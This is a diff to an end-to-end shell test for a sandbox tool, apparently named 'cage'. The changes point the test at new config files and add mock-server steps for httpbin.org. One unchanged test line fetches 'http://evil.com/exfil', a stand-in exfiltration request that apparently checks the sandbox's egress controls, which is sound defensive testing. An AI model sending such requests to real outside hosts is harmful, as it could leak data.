@@ -13,8 +13,10 @@ if ! curl -sf "$BASE/" >/dev/null 2>&1; then
   echo "Basic cage not running — creating..."
   destroy_cage "$CAGE"
   register_cage "$CAGE"
-  create_cage "$REPO_ROOT/examples/basic/cage.yaml" >/dev/null
+  create_cage "$CONFIGS/basic.yaml" >/dev/null
+  start_mock "$CAGE" httpbin.org
   wait_ready "$BASE" 120 || { e2e_fail "2.0" "Setup" "cage not ready"; print_results; exit 1; }
+  repatch_mock "$CAGE" httpbin.org
   # Generate some traffic
   curl -s "$BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
   curl -s "$BASE/fetch?url=http://evil.com/exfil" >/dev/null 2>&1 || true
@@ -73,7 +75,9 @@ HAR_BASE="http://localhost:$HAR_PORT"
 echo "Creating HAR cage..."
 export E2E_PORT_HAR="$HAR_PORT"
 create_cage "$CONFIGS/har.yaml" >/dev/null
+start_mock "$HAR_CAGE" httpbin.org
 if wait_ready "$HAR_BASE" 120; then
+  repatch_mock "$HAR_CAGE" httpbin.org
   # Generate traffic
   curl -s "$HAR_BASE/fetch?url=http://httpbin.org/get" >/dev/null 2>&1 || true
   # Poll until HAR data is available (up to 15s)
